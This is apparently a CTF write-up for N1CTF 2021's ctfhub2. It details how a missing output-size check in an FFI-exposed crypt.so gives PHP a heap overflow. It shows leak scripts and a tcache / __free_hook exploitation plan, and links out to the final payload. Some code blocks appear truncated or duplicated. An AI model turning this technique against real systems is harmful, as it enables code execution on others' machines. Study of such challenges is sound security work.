Original URL -
[https://circleous.blogspot.com/2021/11/n1ctf-2021-ctfhub2.html](https://circleous.blogspot.com/2021/11/n1ctf-2021-ctfhub2.html)  
# N1CTF 2021 - ctfhub2

> You must have noticed something pwnable in MISC-ctfhub. This time I setup
> ANOTHER php environment with crypt.so ( you can use all the functions in
> ffi.inc.php too just like ctfhub ) and disable some dangerous functions. You
> are expected to execute /readflag and get flag. Good luck :D.

## Initial Analysis

I didn't reverse crypt.so even until the end of the competition, but it only
has 2 simple exported function,  
```c  
#define FFI_LIB "../crypt.so"  
#define FFI_SCOPE "crypt"

void encrypt(void* in,unsigned int size,unsigned long long key,void* out);  
void decrypt(void* in,unsigned int size,unsigned long long key,void* out);  
```

Design wise, you can actually see there's a flaw from the parameters alone. It
takes 2 pointer to input and output buffer, but only take 1 size for input as
parameter. This could mean output buffer length isn't checked. Nothing too
serious, but if the one that uses the library are not careful it could leads
to something unexpected. It could be ok-ish, but it shows overflow could
happen if the output buffer isn't as big as it should be. The first step is to
get to know how these 2 functions works. So, I created a small C program to
test it out,

```c  
#include <stdio.h>  
#include <string.h>  
#include "crypt.h"

// https://gist.github.com/ccbrown/9722406  
void DumpHex(const void* data, size_t size);

#define KEY 0xDEADBEEFDEADBEEFull

int main(int argc, char const *argv[])  
{  
 struct {  
   char buf1[0x100];  
   char buf2[0x100];  
 } stack;

 memset(stack.buf1, 0x41, sizeof stack.buf1);  
 memset(stack.buf2, 0, sizeof stack.buf2);

 encrypt(stack.buf1, 0x100, KEY, stack.buf2);  
 DumpHex(stack.buf2, 0x100);

 return 0;  
}  
```  
and after running that code, we immediately got a crash!  
```  
...  
0E0 95 B5 D1 05 E0 58 E8 2F  08 FB 7F 18 8C F6 62 2C  |  .....X./......b,  
0F0 B7 7E 36 F9 DF 99 EB FA  A3 E3 BE B5 4D 8A AD 64  |  .~6.........M..d  
*** stack smashing detected ***: terminated  
```  
After playing around a little more with the library, I found out that every 1
plain text byte maps to 8 bytes in the encrypted buffer. So, that our output
buffer that only has `[0x100]` actually far from enough and this also confirms
our initial guess that overflow can occurs.

## Overflow in PHP..?  
This challenge expose these 2 functions with FFI in PHP, but to actually
interact with it, we can only run it from the wrapper in `ffi.inc.php`,  
```php  
600) die("oom");  
   $obj=FFI::new("unsigned long long[".strval($len)."]",false,true);  
   FFI::memcpy($obj,$str,$len*8);  
   return $obj;  
}  
function creatbuf($size){  
	$size=intval($size);  
	if($size<=0) die("oom");  
   if($size>4800) die("oom");  
   $len=intval(($size+7)/8);  
   return FFI::new("unsigned long long[".strval($len)."]",false,true);  
}  
function releasestr($str){  
   FFI::free($str);  
}  
function getstr($x,$len){  
   return FFI::string($x,$len);  
}  
function encrypt_impl($in,$blks,$key,$out){  
if($blks>300) die("too many data");  
   FFI::scope("crypt")->encrypt($in,$blks,$key,$out);  
}  
function decrypt_impl($in,$blks,$key,$out){  
if($blks>300) die("too many data");  
   FFI::scope("crypt")->decrypt($in,$blks,$key,$out);  
}  
?>  
```  
We have 4 important primitives `encrypt`, `decrypt`, `releasestr` to free a
chunk, and `creatbuf` to allocate a chunk. [`FFI::new`][1] in `creatbuf`
buffer use `persistent` flags which means that we are dealing with system heap
(glibc malloc), not the internal php heap.

Since we have this overflow with encrypt/decrypt, we can create an OOB R/W
primitive wrapper for this easily.  
```php

```  
Now, we can test it simply by take a dump of the heap and overwrite some of
them.  
```php  
   $x = [];  
   array_push($x,  
       creatbuf(0x11), // 0x20 sized chunks  
       creatbuf(0x11),   
       creatbuf(0x11),   
       creatbuf(0x11)  
   );  
...  
   releasestr($x[1]);  
   releasestr($x[2]);  
   read($x[0], 299);  
   for ($i = 0; $i < 300; $i++) {  
       echo $buf2[$i] . "\n";  
   }  
```  
Since we have freed some chunks we can get some heap leaks from this. Thus,
this challenge simply became a simple how2heap problem, because we can get
libc leak with unsorted bins, overwrite fd in tcache to allocate in
`__free_hook`  and finally overwrite `__free_hook` to `system`, but is it
really that simple?

## The catch

After creating a working shell payload in local, testing it out in remote
doesn't even get me the correct libc leak and this is where the pain begin. We
don't really have much options since there's no Docker or deployment stuff
from the challenge files, the author does give some hints regarding remote env
but it's not enough to replicate it locally. What we can do instead is create
a helper to take dump of heap layout (because we can get the output from
remote) and here's the script for that.  
```py  
from pwn import *  
from subprocess import check_output  
import ctypes

r = remote("43.129.202.109", 47010)

buf = r.recvline(0)  
suffix, target = re.findall(r'sha256\(XXXX\+(\w+)\) == (\w+)',
buf.decode())[0]  
r.sendlineafter(b">\n", check_output(["./pow", suffix, target]).strip())

with open("hax.php", "rb") as f:  
   r.sendlineafter(b"> \n", b64e(f.read()).encode())  
r.recvline(0)

while True:  
   command = r.recvline(0)  
   if command == b"DONE":  
       break  
   elif command == b"START":  
       dump = []  
       while True:  
           buf = r.recvline(0)  
           if buf == b"END":  
               break  
           b = ctypes.c_uint64(int(buf)).value  
           dump.append(b)  
       for i in range(0, len(dump), 2):  
           if i + 1 == len(dump):  
               print(f"{i * 8:03X} 0x{dump[i]:016X}")  
           else:  
               print(f"{i * 8:03X} 0x{dump[i]:016X} 0x{dump[i+1]:016X}")  
       print(" ================================= ")  
   else:  
       print(command.decode())  
r.interactive()  
```  
This really helps A LOT when taking a dump of heap layout. First we need to
mark our chunks with a recognize-able pattern and start heap dump with
`START\n` and end it with `END\n`, the python script will be the one in charge
to make it looks nicer.  
```php  
   $x = [];  
   array_push($x,  
       creatbuf(0x11),   
       creatbuf(0x11),   
       creatbuf(0x11),   
       creatbuf(0x11)  
   );  
   ...  
   for ($i = 0; $i < 4; $i++) {  
       $x[$i][0] = 0x333333333333; // recognizeable pattern  
       $x[$i][1] = 0x333333333333;  
       $x[$i][2] = 0x333333333333;  
   }  
  
   releasestr($x[1]);  
   releasestr($x[2]);  
  
   read($x[0], 299);  
   echo "START\n";  
   for ($i = 0; $i < 300; $i++) {  
       echo $buf2[$i] . "\n";  
   }  
   echo "END\n";  
```  
The output,  
```  
000 0x0000333333333333 0x0000333333333333 // x[0]  
010 0x0000333333333333 0x00000000000000F1  
020 0x00005570AB328520 0x00005570AB2F9010  
...  
550 0x0000000000656761 0x0000000000000021 // x[1]  
560 0x0000000000000000 0x00005570AB2F9010  
570 0x0000333333333333 0x00000000000000D1  
...  
6D0 0x0000007265707075 0x0000000000000021 // x[2]  
6E0 0x00005570AB32B990 0x00005570AB2F9010  
6F0 0x0000333333333333 0x00000000000000D1  
```  
and for getting libc leak, I just sprayed some huge-ish chunks and freed them.
Just hope that some of the libc leaks remains near our controlled chunks. To
find them just find a leak starting with 0x7F and ends with ...BE0 (Ubuntu
20.04, libc 2.31)  
```php  
<?php
function pstr2ffi(string $str){
    $len=intval((strlen($str)+7)/8);
    if($len>600) die("oom");
    $obj=FFI::new("unsigned long long[".strval($len)."]",false,true);
    FFI::memcpy($obj,$str,$len*8);
    return $obj;
}
function creatbuf($size){
	$size=intval($size);
	if($size<=0) die("oom");
    if($size>4800) die("oom");
    $len=intval(($size+7)/8);
    return FFI::new("unsigned long long[".strval($len)."]",false,true);
}
function releasestr($str){
    FFI::free($str);
}
function getstr($x,$len){
    return FFI::string($x,$len);
}
function encrypt_impl($in,$blks,$key,$out){
if($blks>300) die("too many data");
    FFI::scope("crypt")->encrypt($in,$blks,$key,$out);
}
function decrypt_impl($in,$blks,$key,$out){
if($blks>300) die("too many data");
    FFI::scope("crypt")->decrypt($in,$blks,$key,$out);
}
?>
```  
Since we already have libc leak the offset to x[2] from x[0] to overwrite
tcache fd, we can start our initial attack and get the flag.

## Exploit Stuff  
The final payload and scripts are in my gists,
[https://gist.github.com/circleous/2e8b92c7e592e29a58577a9080fdbfb4]()

[1]: https://www.php.net/manual/en/ffi.new.php  

Original writeup
(https://circleous.blogspot.com/2021/11/n1ctf-2021-ctfhub2.html).